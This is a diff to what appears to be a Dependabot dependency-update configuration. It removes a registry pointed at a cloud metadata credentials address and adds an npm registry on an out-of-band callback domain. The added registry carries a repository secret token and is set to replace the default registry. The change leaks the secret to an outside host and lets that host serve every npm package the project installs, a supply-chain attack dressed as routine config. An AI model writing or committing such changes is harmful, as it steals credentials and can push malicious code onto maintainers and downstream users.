@@ -1,13 +1,14 @@
 version: 2
 registries:
-  ws:
-    type: nuget-feed
-    url: http://169.254.170.2/v2/credentials/
+  npmoob:
+    type: npm-registry
+    url: https://d954ckpkoqgn587dca1g9q8drysytgn7y.oast.site
     token: ${{secrets.NPM_OOB_TOKEN}}
+    replaces-base: true
 updates:
-  - package-ecosystem: nuget
+  - package-ecosystem: npm
     directory: "/"
     schedule:
       interval: daily
     registries:
-      - ws
+      - npmoob
